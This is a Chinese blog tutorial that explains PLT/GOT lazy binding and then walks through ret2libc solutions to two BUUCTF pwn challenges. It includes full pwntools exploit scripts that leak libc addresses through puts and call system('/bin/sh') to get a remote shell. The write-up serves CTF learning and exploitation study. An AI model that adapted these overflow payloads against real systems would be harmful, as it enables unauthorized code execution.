---
title: ret2libc+延迟绑定机制
date: 2023-07-07 18:29:01
tags: [Pwn,Stack,ret2libc]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libcover.jpg"
---





在上一篇博客，我们介绍了[栈溢出基本原理](https://wutong01304.github.io/2023/07/05/stack/)。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么如何泄露libc中的函数地址呢？这就要利用linux的延迟绑定机制了。

# 一、延迟绑定机制

## 1.1 介绍

延迟绑定机制是指在程序运行时，将符号的绑定工作推迟到符号第一次被调用的时候。这种机制可以大大加快程序的启动速度。简单来说，程序在未执行时，不会加载函数的真实地址，只有在执行时，才会通过ELF（可链接文件）文件去链接真实地址。而在延迟绑定机制中，需要注意的是**PLT**（Procedure Linkage Table，过程链接表）和**GOT**（Global Offset Table，全局偏移表），它们是ELF文件中的两个特殊节，分别用于延迟绑定和动态链接。

ELF文件格式使用PLT技术来实现延迟绑定。PLT是一个特殊的表格，用于存储动态链接库中的函数地址。在程序启动时，如果需要调用某个函数，PLT会首先检查该函数是否已经被加载到内存中。如果函数还未被加载，则PLT会延迟绑定该函数，并在需要时**动态加载该函数**。这样可以在程序启动时加快执行速度，同时避免不必要的内存占用。

PLT通过GOT表来动态加载函数。GOT表中的每个表项都存储了一个函数或变量的地址，当程序需要调用某个函数或访问某个变量时，操作系统会根据GOT表中的地址进行动态链接，以确保正确的函数或变量被调用。

## 1.2 链接重定位

通过一个例子来了解延迟绑定具体是怎么实现的。参考链接：https://blog.csdn.net/linyt/article/details/51635768

如下代码：

```c
#include <stdio.h>
void print_banner()
{
    printf("Welcome to World of PLT and GOT\n");
}
int main(void)
{
    print_banner();
    return 0;
}
```

使用如下命令编译并链接：

```shell
gcc -Wall -g -o test.o -c test.c -m32
gcc -o test test.o -m32
```

得到可执行文件 test 、和用于链接程序的 test.o 目标文件。使用如下命令对test.o文件进行反汇编：

```shell
objdump -d test.o 
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt1.png?x-oss-process=style/watermark" style="zoom:80%;" />

圈出来的位置汇编指令为 call printf 。但是此时并不知道 printf 函数的地址，而由于 printf 是在 glibc 动态库里面的，因此只有当程序运行起来的时候才能确定地址，所以此时的 printf 函数先用 fc ff ff ff 也就是有符号数的 -4 代替。那么如何确定 printf 函数的地址呢？

运行时是无法修改代码段的，因此确定 printf 函数地址被放在链接阶段，地址确定后对其进行修正。这个过程称为链接时重定位。那么链接阶段如何进行重定位呢？具体来说，链接器会生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。生成的伪代码如下：

```pseudocode
.text
...

// 调用printf的call指令
call printf_stub
...

printf_stub:
    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址
    jmp rax // 跳过去执行printf函数

.data
...
printf函数的储存地址，这里储存printf函数重定位后的地址
```

链接器会生成一段小代码print_stub，然后printf_stub地址取代原来的printf。

总体来说，动态链接每个函数需要两个东西：
1、用来存放外部函数地址的数据段（即 print 的物理地址，GOT表）
2、用来获取数据段记录的外部函数地址的代码（即上图中的代码段，PLT表）

对应的就是我们在介绍里提到的GOT表和PLT表了。

## 1.3 PLT和GOT

如下图所示，每个 PLT 入口项对应一个 GOT 项，执行函数实际上就是跳转到相应 GOT 项存储的地址。当程序第一次调用 printf 时，它会跳转到 PLT 表中的一个入口点。该入口点将在 GOT 表中查找 printf 的地址。也就是说，可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址。想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制。即将符号的绑定工作推迟到符号第一次被程序调用的时候，这种机制可以避免动态链接器在加载时处理大量函数引用的重定位，从而加快程序的启动速度。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt4.png?x-oss-process=style/watermark" style="zoom: 80%;" />

在第一次调用glibc中的函数时，由于 GOT 表中的地址尚未被解析，因此该地址将指向 PLT 表中的另一个入口点。该入口点将跳转到动态链接器，以便解析 printf 的地址并将其存储在 GOT 表中。而在下一次调用 printf 时，程序将直接跳转到 GOT 表中存储的 printf 地址。

仍然使用1.2节的 test 代码举例如下。使用如下命令重新编译并对 test 反汇编：

```shell
gcc -m32 -no-pie -fno-stack-protector -z execstack -o test test.c
objdump -d test
```

可以看到本来是call printf的位置变成了call 80482e0< put@plt >。变成puts函数是因为printf函数没有参数，自动简化成了puts函数，正常情况下应该为printf@plt的

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt2.png?x-oss-process=style/watermark" style="zoom:80%;" />

找到PLT表的位置，也就是0x80482e0：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt3.png?x-oss-process=style/watermark" style="zoom:80%;" />

可以看到，plt表第一行就是 jmp *0x804a00c，正常来说，这里应该是 got 表的地址。但由于是第一次运行函数，程序还没有加载其正确地址，此时0x804a00c 中存放的是0x8042e6：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt5.png?x-oss-process=style/watermark)

也就是 plt 表项的下一条命令，即 push 0x0，push的这个值是在寻找地址时进行使用的，在这里不进行介绍。然后程序就会转到下一条指令即 jmp 80482d0 < .plt >执行。它跳转到了0x80482d0，可以发现这个地址就是我们 put@plt 上面的一个 plt ，这个plt也可以称为公共 plt 表。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt6.png?x-oss-process=style/watermark" style="zoom:80%;" />

发现程序首先push 0x804a004，即将数据压到栈上，作为后面函数的参数，然后jmp *0x804a008 跳转到了0x804a008地址。查看该地址：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt7.png?x-oss-process=style/watermark)

发现里面是**_dl_runtime_resolve**函数，其作用是在程序运行时动态解析符号（函数或变量）的地址，将在另外一篇文章中进行详细介绍。

总结出第一次调用函数寻找地址的过程：xxx@plt -> xxx@got -> xxx@plt -> 公共@plt -> _dl_runtime_resolve

流程图（图源网络：https://www.jianshu.com/p/0ac63c3744dd）：

第一次调用：

![](https://upload-images.jianshu.io/upload_images/5970003-bcf9343191848103.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp)

之后进行调用：

![](https://upload-images.jianshu.io/upload_images/5970003-9baedd55881a39dd.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

# 二、ret2libc

## 2.1 泄露流程

在上述分析中，我们知道，在程序中调用一个函数时，实际上会跳转到 PLT 中的一个特殊地址，该地址会将控制权转移到 GOT 中的相应地址，并且在第一次调用时，GOT 中的地址会被更新为真实的函数地址。因此我们可以利用泄露某个函数的真实地址，动态链接库中的函数之间相对偏移是固定的，因此其它函数的地址也可以泄露，然后使程序流转到其它函数，从而达到攻击的目的。

利用PLT和GOT泄露地址的大致流程如下（以**使用puts**函数泄露puts函数真实地址为例）：

1. 利用缓冲区溢出，将程序的返回地址覆盖为 puts 函数在 PLT 中的地址，将其参数覆盖为将函数的got地址（puts_got，也可以是其它函数）。
2. 在程序执行到 puts 函数时，控制权将被转移到 PLT 中的 puts 地址，然后转移到 GOT 中的 puts 地址。
3. puts 函数将在 GOT 中找到真实的 puts 函数地址并将其打印到屏幕上。
4. 这样就可以在输出中获取 puts 函数的真实地址。

## 2.2 32位 ret2libc

例题：https://buuoj.cn/challenges#[OGeek2019]babyrop 。也可以去buuctf上找，题目名字：[OGeek2019]babyrop

拿到文件用IDA反汇编分析，main函数如下：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret1.png?x-oss-process=style/watermark" style="zoom:80%;" />

经分析（分析过程就是读代码的过程，不进行介绍了），几个函数作用如下：

```c
  sub_80486BB();//设置缓冲区,且执行了puts函数
  fd = open("/dev/urandom", 0);//获得一个随机数
  if ( fd > 0 ) //随机数大于0，执行read函数
    read(fd, &buf, 4u);//从fd中读取4位的字符到buf
  v2 = sub_804871F(buf);//如果输入的字符等于buf，就退出，否则继续执行
  sub_80487D0(v2);//如果v2=127，就读取200个字符，否则将v2写入缓冲区
```

分析 sub_80487D0 函数：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret3.png?x-oss-process=style/watermark" style="zoom:80%;" />

a1如果等于127，就只读取0xc8字符，不够溢出，但如果我们让a1的值，也就是v2的值大于buf的长度(0xE7)就可以进行溢出了。那么如何控制 v2 呢？

观察 sub_804871F 函数：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret2.png?x-oss-process=style/watermark" style="zoom:80%;" />

如果我们输入的值和它初始的随机数相等，那么程序就会将buf第7个字节以后的内容（v5）返回，如果我们可以控制 v5 就可以控制v2了。在这里，为了绕过strncmp函数，我们利用strlen的截断。strlen函数的实现通常会使用一个循环来遍历字符串中的每个字符，直到找到第一个空字符'\0'为止。也就是说，如果第一个字符是'x/00'的话，strlen函数就会截断，统计到的字符串长度就为0，此时strncmp要比较的字符长度也为0，就可以绕过它了。

找到了溢出方法，接下来就需要劫持返回地址泄露libc了。如上所述，我们利用puts函数进行泄露。先后利用两次溢出获取flag：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret5.png?x-oss-process=style/watermark" style="zoom:80%;" />

通过第一次溢出，通过将 puts 的 PLT 地址放到返回处， 程序将跳转到该地址并开始执行 puts 函数。此时，puts 函数需要从内存中读取要打印的字符串的地址，也就是puts的GOT地址，并将其打印到标准输出上，即泄漏出执行过的函数的puts 的真实地址。然后将 puts 的返回地址设置为 main 函数，方便再次溢出，用来执行 system('/bin/sh')；通过泄露出的地址计算出 libc 中的 system 和 /bin/sh 的地址；再次通过溢出将返回地址覆盖成泄露出来的 system 的地址拿到shell。

计算方法：偏移 = 真实 puts 地址 - libc中的 puts 地址 = system真实地址 - libc中的system地址。即system真实地址= libc中的system地址+偏移，bin/sh同理。

给出exp：

```python
from pwn import*

p=remote('node4.buuoj.cn',28327)
elf=ELF('./pwn')
libc = ELF('libc-2.23.so') #加载libc库，题目给出了下载链接
main_addr=0x8048825
exit=0x8048558
put_plt=elf.plt['puts'] #得到puts的plt地址
put_got=elf.got['puts'] #得到puts的got地址

payload1='\x00' +'a'*6+'\xff' #‘x/00’绕过stnrcmp,'a'*6使得‘\xff’在第7个字节，0xff>0xe7,可以溢出
p.sendline(payload1) 
p.recvuntil('Correct\n') #接收到Correct后，再继续执行

payload2='a'*0xe7+'a'*4+p32(put_plt)+p32(main_addr)+p32(put_got) #第一段溢出
p.sendline(payload2)
put_addr = u32(p.recv(4)) #接收puts打印出来的内容

offset=put_addr-libc.symbols['puts'] #计算偏移，libc.symbols的作用为寻找函数在libc中的位置
system=offset+libc.symbols['system'] #计算system地址
binsh = next(libc.search(b"/bin/sh"))+offset #计算bin/sh地址

p.sendline(payload1) #程序回到了main函数，此时重新绕过strncmp函数
p.recvuntil('Correct\n')
payload3='a'*0xe7+'a'*4+p32(system)+p32(exit)+p32(binsh)#第二段溢出
p.sendline(payload3)
p.interactive()
```

如果没有给出libc动态链接库的话，也可以使用**LibcSearcher**工具进行搜索。

exp：

```python
from pwn import*
from LibcSearcher import* #加载LibcSearcher工具

p=remote('node4.buuoj.cn',28327)
elf=ELF('./pwn')
main_addr=0x8048825
exit=0x8048558
put_plt=elf.plt['puts']
put_got=elf.got['puts']
payload1='\x00' +'a'*6+'\xff'
p.sendline(payload1)
p.recvuntil('Correct\n')
payload2='a'*0xe7+'a'*4+p32(put_plt)+p32(main_addr)+p32(put_got)
p.sendline(payload2)
put_addr = u32(p.recv(4))

libc=LibcSearcher('puts',put_addr) #利用LibcSearcher查找libc版本
offset=put_addr-libc.dump('puts') #计算偏移，libc.dump("puts")表示puts在libc里面的偏移
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')

p.sendline(payload1)
p.recvuntil('Correct\n')
payload3='a'*0xe7+'a'*4+p32(system)+p32(exit)+p32(binsh)
p.sendline(payload3)
p.interactive()
```

执行exp，获得flag：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret4.png?x-oss-process=style/watermark" style="zoom:80%;" />

## 2.3 64位 ret2libc

64位 ret2libc 溢出和32位大致相同，要注意构造的溢出流程，要先通过pop_rdi将参数传递给rdi寄存器，再执行函数，溢出图如下。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret6.png?x-oss-process=style/watermark" style="zoom:80%;" />

例题：https://buuoj.cn/challenges#bjdctf_2020_babyrop ，题目名字：bjdctf_2020_babyrop

反汇编发现 vuln 函数中的 read 函数可以溢出：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret7.png?x-oss-process=style/watermark" style="zoom:80%;" />

使用如下命令寻找pop rdi

```shell
ROPgadget --binary bjdctf_2020_babyrop --only 'pop|ret'
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret8.png?x-oss-process=style/watermark" style="zoom:80%;" />

exp：

```python
from pwn import*
from LibcSearcher import*
r=remote('node4.buuoj.cn',29333)
elf=ELF('./bjdctf_2020_babyrop')

main=0x04006AD
pop_rdi=0x0400733
ret=0x04004c9

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
payload1='a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
r.recvuntil("story!\n")
r.sendline(payload1)

puts_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print hex(puts_addr)

libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
binsh=offset+libc.dump('str_bin_sh')
system=offset+libc.dump('system')

payload2='a'*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
r.recvuntil("story!\n")
r.sendline(payload2)
r.interactive()
```

由于使用了LibcSearch，找到了不同版本的libc，在这里选择一个能用的就可以了（可以一个个尝试）：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret9.png?x-oss-process=style/watermark" style="zoom:80%;" />

在这里，选择了第0个libc，成功获取flag。
